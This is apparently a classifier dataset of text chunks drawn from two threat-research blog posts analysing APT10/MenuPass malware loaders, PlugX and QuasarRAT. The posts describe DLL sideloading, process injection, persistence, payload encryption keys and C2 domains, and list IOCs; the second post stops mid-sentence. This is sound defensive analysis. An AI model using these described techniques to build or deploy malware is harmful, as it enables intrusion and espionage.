[
    {
        "text": "\n\n\n\n\n\n\nUncovering New Activity By APT10 | FortiGuard Labs\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nBlog\n\n\n\n\nCategories\n\n\n\nBusiness & Technology \n\n\n\n\n FortiGuard Labs Threat Research\n\n\n\n\nIndustry Trends\n\n\n\n\nPartners\n\n\n\n\nCustomer Stories\n\n\n\n\nPSIRT Blogs\n\n\n\n\n\n\nBusiness & Technology \n\n\n\n\nFortiGuard Labs Threat Research\n\n\n\n\nIndustry Trends\n\n\n\n\nPartners\n\n\n\n\nCustomer Stories\n\n\n\n\nPSIRT Blogs\n\n\n\n\nCISO Collective\n\n\nSubscribe\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFortiGuard Labs Threat Research\nUncovering New Activity By APT10\n\n\n\n\n\nBy \n\nBen Hunter\n\n\n\n | October 15, 2019\n\n\n\n\n\n\n\n\nFortiGuard Labs\u00a0Threat Analysis Report:",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": false,
            "confidence": 0.4372008740901947
        },
        "prediction": {}
    },
    {
        "text": "This blog originally appeared on the enSilo website and is republished here for threat research purposes.\u00a0",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.7277275919914246
        },
        "prediction": {}
    },
    {
        "text": "enSilo was\u00a0acquired\u00a0by Fortinet in October 2019.\n Summary\nIn April 2019, we detected what we believe to be new activity by\u00a0the Chinese cyber espionage group\u00a0APT10.",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.5472098588943481
        },
        "prediction": {}
    },
    {
        "text": "The discovered variants are previously unknown and deploy malware that is unique to the threat actor. These malware families have a rich history of being used in numerous targeted attacks against government and private organizations.",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.694088339805603
        },
        "prediction": {}
    },
    {
        "text": "The activity surfaced in Southeast Asia, a region where APT10 frequently operates.\n Overview\nTowards the end of April 2019, we tracked down what we believe to be new activity by\u00a0APT10, a Chinese cyber espionage group. Both of the loader\u2019s variants, as well as the various payloads that we analyzed share similar Tactics, Techniques, and Procedures (TTPs) and code associated with APT10.\n Although they deliver different payloads to a victim's machine, both variants drop the following files beforehand:\n\njjs.exe - legitimate executable\njli.dll - malicious DLL\nmsvcrt100.dll - legitimate Microsoft C Runtime DLL\nsvchost.bin - binary file\n\njjs.exe is a JVM-based implementation of a javascript engine that is part of the Java platform developed by Oracle, but in this case it served as a loader for the malware.\n",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": false,
            "confidence": 0.33652734756469727
        },
        "prediction": {}
    },
    {
        "text": "The former is well known to be developed in-house by the group with a rich history of being used in many targeted attacks against different government and private organizations.",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.6696489453315735
        },
        "prediction": {}
    },
    {
        "text": "PlugX is a modular structured malware that has many different operational plugins, such as communication compression and encryption, network enumeration, files interaction, remote shell operations, and more.\n",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.5197045803070068
        },
        "prediction": {}
    },
    {
        "text": "In this article we examine both versions of the loader along with their payloads, TTPs, and Command and Control (C&C) server information.\n",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.6036513447761536
        },
        "prediction": {}
    },
    {
        "text": "Loader\nAbusing a Legitimate Executable\nThe loader starts out by running a legitimate executable, which is abused to load a malicious DLL instead of a legitimate one on which it depends.",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.6467342376708984
        },
        "prediction": {}
    },
    {
        "text": "In both variants, the abused executable is\u00a0jjs.exe, which loads jli.dll. The DLL exports the following functions:\n\nJLI_CmdToArgs\nJLI_GetStdArgs\nJLI_GetStdArgc\nJLI_MemAlloc\nJLI_Launch\n\nThe first function called by jjs.exe is\u00a0JLI_CmdToArgs, which is implemented by the malware author and behaves differently in each variant.\n Running The Payload\nThe malicious DLL maps the data file, svchost.bin, to memory and decrypts it.",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": false,
            "confidence": 0.41661393642425537
        },
        "prediction": {}
    },
    {
        "text": "The decrypted content is a shellcode that is injected into svchost.exe and contains the actual malicious payload.\n The decryption process resembles previous versions used by the group in PlugX\\RedLeaves.\n\n\n\n\n Figure 1: Decryption of the binary file\n\n\nThe injection flow is rather simple and is done by creating a process in suspended state, allocating memory with\u00a0VirtualAllocEx, writing the shellcode with\u00a0WriteProcessMemory, and running it using\u00a0CreateRemoteThread. The complete execution flow is visualized in Figure 2, below.\n\n\n\n\n Figure 2: Loader\u2019s execution flow\n\n\nVariant 1\nThe first variant uses a service as its persistence method.",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": false,
            "confidence": 0.4084627628326416
        },
        "prediction": {}
    },
    {
        "text": "When running in the context of the service, it performs the decryption and injection described above.\n",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.7000554800033569
        },
        "prediction": {}
    },
    {
        "text": "We have observed the variant delivering\u00a0both Quasar and PlugX, which we\u2019ll discuss later on.\n Among the different samples we tested, we encountered the following service names being registered:\n\nWxUpdateServiceInfo\nHxUpdateServiceInfo\nWinDefendSec\nWeb_Client\nclr_optimization_v4.0.30319_31\nclr_optimization_v4.0.30319_37\n\nVariant 2\nUnlike the first variant, this variant uses the Run registry key for the current user under the name \u201cWindows Updata\u201d to ensure its persistence, rather than installing a service. This variant delivered the same PlugX DLL as the first loader.\n Payloads\nModified Quasar RAT\nThe injected shellcode reflective loads in-memory an executable it reconstructs from data that it is bundled with it.",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": false,
            "confidence": 0.4012218713760376
        },
        "prediction": {}
    },
    {
        "text": "The reflective load code is obfuscated, as function calls are made by dynamically resolving their addresses according to hashed values.\n",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.6565890312194824
        },
        "prediction": {}
    },
    {
        "text": "The executable tries to run conhost.exe from C:\\Users\\Public\\Documents, and in case it doesn\u2019t exist, it turns to\u00a0ffca[.]caibi379[.]com\u00a0to download it.",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.5430703163146973
        },
        "prediction": {}
    },
    {
        "text": "While\u00a0wininet!InternetOpenW\u00a0(the Unicode version of the function) is used, an ascii value is provided as the User-Agent, so instead of \u201cRookIE/1.0\u201d, the request headers will include inconsistent and meaningless values, as can be seen in Figure 3.\n\n\n\n\nFigure 3: .NET",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.6179825663566589
        },
        "prediction": {}
    },
    {
        "text": "In our analysis, the conhost.exe that was downloaded is itself another downloader written in .NET and disguised as a legitimate system executable.\n This extremely simplified downloader only has the ability to download and execute a base-64 encoded executable from the hardcoded address using a simple System.",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.6165290474891663
        },
        "prediction": {}
    },
    {
        "text": "This version contains the addition of\u00a0SharpSploit\u00a0to extract passwords from a victim\u2019s machine using the framework\u2019s built-in mimikatz capabilities.\n\n\n\n\n Figure 4: Quasar Assembly information\n\n\n\n\nFigure 5: Embedded SharpSploit code\n\n\nExamining the sample\u2019s configuration, we found the following:\n\nC&C server: cahe.microsofts.org:443\nMutex name: \u201cQSR_MUTEX_rSifQNOVTwHrsBs2nd\u201d\nA self-signed certificate issued to \u201cMSGQ Server CA\u201d (as seen in Figure 6)\n\n\n\n\n\nFigure 6: Quasar's embedded certificate\n\n\nPlugX\nFollowing the injection to svchost.exe by the loader, the shellcode decrypts another part of itself and use RtlDecompressBuffer API to further unpack the PlugX DLL. The DOS and NT header\u2019s magic values, MZ and PE respectively, were replaced with VX, a typical behavior for PlugX payloads.",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": false,
            "confidence": 0.4986484944820404
        },
        "prediction": {}
    },
    {
        "text": "This is meant to prevent security products and automated tools from identifying the executable headers when performing memory scans.\n",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.6895499229431152
        },
        "prediction": {}
    },
    {
        "text": "Like previous versions of PlugX, it collects information about the infected machine, such as the computer name, username, OS version, RAM usage, network interfaces, and resources.\u00a0\n In an attempt to generate noise around allocation and release of memory by the malware, the authors wrapped it with dummy calls to the\u00a0GetForegroundWindow\u00a0API function, as can be seen in Figure 7.\n\n\n\n\nFigure 7: Dummy calls to GetForegroundWindow\n\n\nThis sample shares some similarities with the\u00a0Paranoid PlugX\u00a0variant. For example, it goes a long way to completely remove any sign of McAfee\u2019s email proxy service from the infected machine. Besides killing the process, it also makes sure to delete any related keys in the registry, and recursively deletes any related files and directories on the machine. The same behavior was observed by in the paranoid variant as part of a VBScript that the dropper runs.\n Typically, APT10 tends to employ a namesquatting scheme in their domains that aims to confuse the observer by posing as a legitimate domain.",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": false,
            "confidence": 0.36484280228614807
        },
        "prediction": {}
    },
    {
        "text": "In the configuration bundled to the samples we found the following:\n\nThe sample in the first loader communicates with\u00a0update[.]microsofts[.]org\u00a0with DNS over TCP.\n The sample in the second loader communicates with\u00a0update[.]kaspresksy[.]com\u00a0over HTTPS.\n\n Threat Intelligence\n",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.5854421257972717
        },
        "prediction": {}
    },
    {
        "text": "When examining the first loader variant\u2019s domain (ffca[.]caibi379[.]com), we discovered that it resolved to the following IP addresses according to VirusTotal:\n\n\n     ",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.6459318995475769
        },
        "prediction": {}
    },
    {
        "text": "While all the IP address ranges are listed under the name of an organization located in South Korea, the domain itself was registered in Hong Kong.\n Reverse lookup on the IP addresses shows that some of them used to be resolved from another domain -\u00a0*",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.6411597728729248
        },
        "prediction": {}
    },
    {
        "text": "As mentioned before,\u00a0cahe.microsofts.org\u00a0is the command and control server for the Quasar payload, and\u00a0update.microsofts.org\u00a0is used for the PlugX payload delivered by the first loader variant.\n The PlugX\u2019s domains resolve to the following addresses:\u00a0\n\n\n     Date Resolved   IP     2019-04-27   27.102.66.67     2019-02-19   27.102.115.249     2019-03-15   27.102.127.80     \n\n\nWhile looking at the other subdomains of kaspresksy[.]com we discovered that:\n\ndownload[.]kaspresksy[.]com resolves to\u00a027.102.113.118\napi[.]kaspresksy[.]com resolves to\u00a027.102.114.246\n\n27.102.114.246 used to previously resolve from the following domains:\n\nsmsapi[.]tencentchat[.]net\nonedrive[.]miscrosofts[.]com\n\n\n\nWe noticed a password-protected zip named \u201cChrome_Updata\u201d being associated with the\u00a0download[.]kaspresksy[.]com\u00a0domain.",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": false,
            "confidence": 0.25153279304504395
        },
        "prediction": {}
    },
    {
        "text": "The zip contained a sample of the Poison Ivy malware, which is also known to be used by APT10. The same executable was also seen communicating with 27.102.115.249, which also appeared to be mapped to\u00a0update[.]kaspresksy[.]com.\n",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.5043463706970215
        },
        "prediction": {}
    },
    {
        "text": "All of the overlaps in the network infrastructure make it very reasonable to assume that the\u00a0same group is operating both variants.\n Conclusion\nBoth variants of the loader implement the same decryption and injection mechanism.\n Looking at the history of APT10, one can notice major similarities in the details we highlighted in this post:\n\nA bundle of legitimate executables are used to sideload a custom DLL, along with storing the payload in a separate, encrypted file.\n Use of typosquatting domain names similar to real, legitimate tech companies.\n",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": false,
            "confidence": 0.3693007826805115
        },
        "prediction": {}
    },
    {
        "text": "Unique malware families both developed by, and associated with, the group.\n Using C&C servers located in South Korea.\n\n",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.5660816431045532
        },
        "prediction": {}
    },
    {
        "text": "Some of the mentioned domain mappings were recently updated. Also, the certificate embedded in the Quasar sample was issued at 22.12.2018, which correlates with the file\u2019s compilation date. This may indicate that these samples are a part of a testing environment or a short-lived attack that is already finished. Either way, it\u2019s safe to say that the threat actor behind APT10 is still active and that we have yet to see the last of the group.\n",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.5596781373023987
        },
        "prediction": {}
    },
    {
        "text": "IOCs\nLoader v1:\n 41542d11abf5bf4a18332e9c4f2c8d1eb5c7e5d4298749b610d86caaa1acb62c (conhost.exe downloader jli.dll)\n29b0454db88b634656a3fc7c36f318b126a83ae8fb7f73fe9ff349a8f8536c7b (conhost.exe downloader svchost.bin)\n02b95ef7a33a87cc2b3b6fd47db03e711045974e1ecf631d3ba9e076e1e374e9 (PlugX jli.dll)\ne0f91da52fdc61757f6a3f276ae77b01d2d1cc4b3743629c5acbd0341e5de80e (PlugX svchost.bin)\n Loader v2:\nf13536685206a94a8d3938266f100bb2dffa740a202283c7ea35c58e6dbbb839 (PlugX jli.dll)\nc8d86e9f486d23285b744279812ef9047a0908e39656c2ea4cdf3e182f80e11d (PlugX svchost.bin)\n.NET Downloader (conhost.exe):\n96649c5428c874f2228c77c96526ff3f472bc2425476ad1d882a8b55faa40bf5\nQuasar RAT:\n0644e561225ab696a97ba9a77583dcaab4c26ef0379078c65f9ade684406eded\nDomains:\nupdate[.]kaspresksy[.]com\ndownload[.]kaspresksy[.]com\napi[.]kaspresksy[.]com\nffca[.]caibi379[.]com\nupdate[.]microsofts[.]org\nppit[.]microsofts[.]org\ncahe[.]microsofts[.]org\nIP Addresses:\n27.102.128.157\n27.102.127.80\n27.102.127.75\n27.102.66.67\n27.102.115.249\nSolutions\u00a0\nThe\u00a0FortiEDR\u00a0platform is capable of detecting the this threat on both pre-execution and post-execution.\u00a0\u00a0\n",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": false,
            "confidence": 0.2255893051624298
        },
        "prediction": {}
    },
    {
        "text": "Learn more about\u00a0FortiGuard Labs\u00a0threat research and the FortiGuard Security Subscriptions and Services\u00a0portfolio.\u00a0 Sign up\u00a0for the weekly Threat Brief from FortiGuard Labs.\u00a0\nLearn more about Fortinet\u2019s\u00a0free cybersecurity training initiative\u00a0or about the Fortinet\u00a0Network Security Expert program,\u00a0Network Security Academy program, and\u00a0FortiVet program.\n\u00a0\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n News & Articles\n\n\nNews Releases\n\n\nNews Articles\n\n\n\n\nSecurity Research\n\n\nThreat Research\n\n\nFortiGuard Labs\n\n\nThreat Map\n\n\nRansomware Prevention\n\n\n\n\nConnect With Us\n\n\nFortinet Community\n\n\nPartner Portal\n\n\nInvestor Relations\n\n\nProduct Certifications\n\n\n\n\nCompany\n\n\nAbout Us\n\n\nExec Mgmt\n\n\nCareers\n\n\nTraining\n\n\nEvents\n\n\nIndustry Awards\n\n\nSocial Responsibility\n\n\nCyberGlossary\n\n\nSitemap\n\n\nBlog Sitemap\n\n\n\n\nContact Us\n\n(866)",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": false,
            "confidence": 0.394809752702713
        },
        "prediction": {}
    },
    {
        "text": "All Rights Reserved\nTerms of Services\nPrivacy Policy\n | Cookie Settings\n\n\n\n\n\n\n\n\nCookie Preference CenterYour PrivacyStrictly Necessary CookiesPerformance CookiesFunctional CookiesTargeting CookiesYour PrivacyWhen you visit any website, it may store or retrieve information on your browser, mostly in the form of cookies.  ",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.5167487859725952
        },
        "prediction": {}
    },
    {
        "text": "Because we respect your right to privacy, you can choose not to allow some types of cookies.  ",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.5173817873001099
        },
        "prediction": {}
    },
    {
        "text": "Click on the different category headings to find out more and change our default settings.   However, blocking certain cookies in the Functional category may impact your experience of the site and the services we are able to offer.\n                         privacy policyStrictly Necessary CookiesAlways ActiveThese cookies are necessary for the website to function and cannot be switched off in our systems.",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.6238236427307129
        },
        "prediction": {}
    },
    {
        "text": "They are usually only set in response to actions made by you which amount to a request for services, such as setting your privacy preferences, logging in or filling in forms.",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.5568468570709229
        },
        "prediction": {}
    },
    {
        "text": "You can set your browser to block or alert you about these cookies, but some parts of the site will not then work.",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.637244701385498
        },
        "prediction": {}
    },
    {
        "text": "Cookies Details\u200ePerformance Cookies  Performance Cookies These cookies allow us to count visits and traffic sources so we can measure and improve the performance of our site.",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.6452024579048157
        },
        "prediction": {}
    },
    {
        "text": "They help us to know which pages are the most and least popular and see how visitors move around the site.",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.7284154891967773
        },
        "prediction": {}
    },
    {
        "text": "Cookies Details\u200eFunctional Cookies  Functional Cookies These cookies enable the website to provide enhanced functionality and personalisation.",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.7160791158676147
        },
        "prediction": {}
    },
    {
        "text": "They may be set by us or by third party providers whose services we have added to our pages.",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.5347203612327576
        },
        "prediction": {}
    },
    {
        "text": "If you do not allow these cookies then some or all of these services may not function properly.",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": false,
            "confidence": 0.4902583956718445
        },
        "prediction": {}
    },
    {
        "text": "These cookies may be set through our site by our advertising partners. They may be used by those companies to build a profile of your interests and show you relevant adverts on other sites. They are based on uniquely identifying your browser and internet device.",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": true,
            "confidence": 0.558278501033783
        },
        "prediction": {}
    },
    {
        "text": "Button BackVendor Search  Filter ButtonConsent Leg. Interest checkbox label label checkbox label label checkbox label label33Across33AcrossView Third Party CookiesNamecookie nameClear checkbox label labelApply CancelConfirm My Choices Allow AllYour Privacy [`dialog closed`]Cookie SettingsBy clicking \u201cAccept All\u201d, you agree to use of cookies on your device to enhance site functionality, analyze site usage, and assist in our marketing efforts.   The Cookies Settings link has cookie-specific detail and preference options.   privacy policyReject All Accept AllCookies Settings",
        "source": "Uncovering New Activity By APT10 _ FortiGuard Labs.html",
        "detection": {
            "response": false,
            "confidence": 0.4216305911540985
        },
        "prediction": {}
    },
    {
        "text": "\n\n\n\n\n\n\nThreat Spotlight: MenuPass/QuasarRAT Backdoor\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSkip Navigation\n\n\n\n\n\n\nBlackBerry Logo\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nCybersecurity\n\n\nAutomotive & IOT\n\n\nCritical Communications\n\n\nInside BlackBerry\n\n\n\n\n\n\n\n\n\n\n\n\u00d7\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nBlackBerry Blog\n\n\n\n\n\n\n\n\n\n\n\n\n\nBlackBerry Blog\n\n\n        Threat Spotlight: MenuPass/QuasarRAT Backdoor\n    \n\n\n\n\n\n\n\n\n\n\nThreat Spotlight: MenuPass/QuasarRAT Backdoor\n\n\n\n\nRESEARCH & INTELLIGENCE / 06.10.19 / \n\n    The BlackBerry Cylance Threat Research Team\n\n\n\n\n\n\nShare on Twitter\n\n\n\n\n\n\n\nShare on Facebook\n\n\n\n\n\n\n\nShare on Linked In\n\n\n\n\n\n\n\nEmail\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nIntroduction\nDuring the latter half of 2018, BlackBerry Cylance threat researchers tracked a campaign targeting companies from several verticals across the EMEA region. The campaign seemed to be related to the MenuPass (a.k.a. APT10/Stone Panda/Red Apollo) threat actor, and utilized an open-source backdoor named QuasarRAT to achieve persistence within an organization. We identified several distinct loader variants tailored to specific targets by leveraging machine learning (ML) to analyse our malware corpus. We have not observed new QuasarRAT samples in the wild since late 2018, roughly coinciding with when the FBI indicted several members of the MenuPass group.\n QuasarRAT is a lightweight remote administration tool written in C#.",
        "source": "Threat Spotlight_ MenuPass_QuasarRAT Backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.20215240120887756
        },
        "prediction": {}
    },
    {
        "text": "It can collect system information, download and execute applications, upload files, log keystrokes, grab screenshots/camera captures, retrieve system passwords and run shell commands.",
        "source": "Threat Spotlight_ MenuPass_QuasarRAT Backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.41734251379966736
        },
        "prediction": {}
    },
    {
        "text": "The remote access Trojan (RAT) is loaded by a bespoke loader (a.k.a. DILLWEED). The encrypted QuasarRAT payload is stored in the Microsoft.",
        "source": "Threat Spotlight_ MenuPass_QuasarRAT Backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.658240795135498
        },
        "prediction": {}
    },
    {
        "text": "In later variants an additional component is also used to install the RAT as a service (a.k.a DILLJUICE).\n The following technical analysis focuses on the bespoke QuasarRAT loader developed by MenuPass and modifications made to the QuasarRAT backdoor.\n Introducing the QuasarRAT Loader\n\nOverview\nThe QuasarRAT loader typically arrives as a 64-bit service DLL.",
        "source": "Threat Spotlight_ MenuPass_QuasarRAT Backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.5773859024047852
        },
        "prediction": {}
    },
    {
        "text": "Its primary purpose is to decrypt, load and invoke an embedded .NET assembly in-memory using the CppHostCLR technique. This technique is based on code snippets from Microsoft DevCentre examples.",
        "source": "Threat Spotlight_ MenuPass_QuasarRAT Backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.5568045377731323
        },
        "prediction": {}
    },
    {
        "text": "The assembly, obfuscated with ConfuserEx, is subsequently responsible for finding, decrypting, and executing a separate malicious .NET module.",
        "source": "Threat Spotlight_ MenuPass_QuasarRAT Backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.6019566655158997
        },
        "prediction": {}
    },
    {
        "text": "During our investigation we encountered several variants of the loader which indicated a development path lasting over a year; we were also able to locate some (but not all) of the encrypted payload files belonging to these loader variants. After decryption, we discovered that the payloads are backdoors based on the open-source code of QuasarRAT[1], version 2.0.0.0 and 1.3.0.0.\n\n Features\n\nSeveral layers of obfuscation\nPayload and its immediate loader are .NET assemblies\nInitial loader uses the CppHostCLR[2] technique to inject and execute the .NET loader assembly\nPayload encrypted and stored under Microsoft. NET directory\nKnown to load QuasarRAT, but may work with any other .NET payload\n\n\nInitial Loader and AntiLib\nThe initial loader binary is a 64-bit PE DLL, intended to run as a service. The DllMain function is empty, while the malicious code is contained in the ServiceMain export. Some variants include an additional randomly named export that creates the malicious service.",
        "source": "Threat Spotlight_ MenuPass_QuasarRAT Backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.31587934494018555
        },
        "prediction": {}
    },
    {
        "text": "In newer versions this functionality was shifted to a standalone module.\n The malware starts by deobfuscating an embedded next-stage executable. In the earliest variant, this is performed using simple XOR with a hardcoded 8-byte key composed of random letters. Later variants use a slightly more advanced XOR based algorithm that requires two single-byte keys.",
        "source": "Threat Spotlight_ MenuPass_QuasarRAT Backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.5740604996681213
        },
        "prediction": {}
    },
    {
        "text": "It\u2019s possible that this approach was implemented to thwart XOR bruteforcing attempts:\n\nFigure 1: Second stage decryption loop\nStarting with variant 3, the .NET injection mechanism is implemented inside a second stage DLL, which according to debugging strings seems to be part of a project called \u201cAntiLib\u201d:\n\nFigure 2: Debugging strings from variant 3\nThis DLL is reflectively loaded into memory by an obfuscated shellcode-like routine and invoked by executing an export bearing the unambiguous name: \u201cFuckYouAnti\u201d. Older samples do not contain this second stage library, and the .NET loading functionality is implemented directly in the initial loader:\n\n\n Figure 3: FuckYouAnti string in the code and in 2nd stage DLL export table\nOnce executed, the \"FuckYouAnti\" function will decrypt the .NET loader binary using the same XOR based algorithm with a different pair of hardcoded keys.\n\n To load the assembly directly into memory, the malware makes use of a technique called \"CppHostCLR\" which is described in detail in Microsoft DevCentre. The code looks like the example code provided by Microsoft.",
        "source": "Threat Spotlight_ MenuPass_QuasarRAT Backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.38936319947242737
        },
        "prediction": {}
    },
    {
        "text": "It invokes the loader entry point using hardcoded class and method names, that are random and differ for each sample:\n\n\nFigure 4: Use of CppHostCLR technique\n\nFigure 5: Invoking .NET assembly loader\nString Encryption\nHardcoded .NET version strings and several persistence related strings (in earlier variants) are encrypted using a custom algorithm. This algorithm is based on a single unit T-box implementation of AES-256, combined with 16-byte XOR.",
        "source": "Threat Spotlight_ MenuPass_QuasarRAT Backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.41854923963546753
        },
        "prediction": {}
    },
    {
        "text": "The oldest variant set keys to \u201c1234567890ABCDEF1234567890ABCDEF\u201d and \u201c1234567890ABCDEF\u201d respectively and did not change between samples:\n\n\nFigure 6: Example AES and XOR decryption keys\n\nFigure 7: String decryption routine\nDigital Certificates\nSamples belonging to variant 3 of the loader present a valid digital signature from CONVENTION DIGITAL LTD (serial number 52 25 B8 E2 2D 3B BC 97 3F DD 24 2F 2C 2E 70 0C) countersigned by Symantec:\n\nFigure 8: Digital certificate from variant 3\nThe .NET loader\nOnce executed, the malicious assembly will iterate through all files under %WINDOWS%\\Microsoft.",
        "source": "Threat Spotlight_ MenuPass_QuasarRAT Backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.39776676893234253
        },
        "prediction": {}
    },
    {
        "text": "NET and attempt to decrypt files matching a specified size. It uses an implementation of RijndaelManaged algorithm in CBC mode:\n\n\nFigure 9: Finding encrypted payload\n\nFigure 10: Final payload decryption\nIf the decryption succeeds, the malware will attempt to load the decrypted assembly and invoke the specified method:\n\nFigure 11. Invoking backdoor payload\nThe final payload assembly is stored as an encrypted file somewhere under the Microsoft.",
        "source": "Threat Spotlight_ MenuPass_QuasarRAT Backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.5024017095565796
        },
        "prediction": {}
    },
    {
        "text": "The framework version is hardcoded in the loader binary in an encrypted form, and in most samples set to \u201cv4.0.30319\u201d. The location is different per sample and the file name imitates one of other the legitimate files found in the same directory.",
        "source": "Threat Spotlight_ MenuPass_QuasarRAT Backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.6492171883583069
        },
        "prediction": {}
    },
    {
        "text": "They are similar, both having a version string in their configuration section set to \u201c2.0.0.0\u201d:\n\n\nFigure 12. Backdoor assembly in memory (version 2.0.0.0)\n\nFigure 13. Backdoor assembly in memory (version 1.3.0.0)\nQuasarRAT Backdoor\nQuasarRAT is an open-source project that proclaims to be designed for legitimate system administration and employee monitoring.",
        "source": "Threat Spotlight_ MenuPass_QuasarRAT Backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.44297903776168823
        },
        "prediction": {}
    },
    {
        "text": "README.md from Quasar GitHub repository\nBehaviour\nThe .NET payload is a heavily obfuscated backdoor based on an open-source remote administration tool called QuasarRAT[3]. The configuration is stored in a class called Settings, with sensitive string values encrypted with AES-128 in CBF mode and base64 encoded. The string\u2019s decryption key is derived from the ENCRYPTIONKEY value inside Settings and is the same for all strings:\n\nFigure 15.",
        "source": "Threat Spotlight_ MenuPass_QuasarRAT Backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.47746023535728455
        },
        "prediction": {}
    },
    {
        "text": "The threat actor modified the original backdoor, adding their own field in the configuration, and code for checking the Internet connectivity.",
        "source": "Threat Spotlight_ MenuPass_QuasarRAT Backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.6938769221305847
        },
        "prediction": {}
    },
    {
        "text": "If a valid URL address is specified in the last value of config, the malware will try to download the content of that URL.",
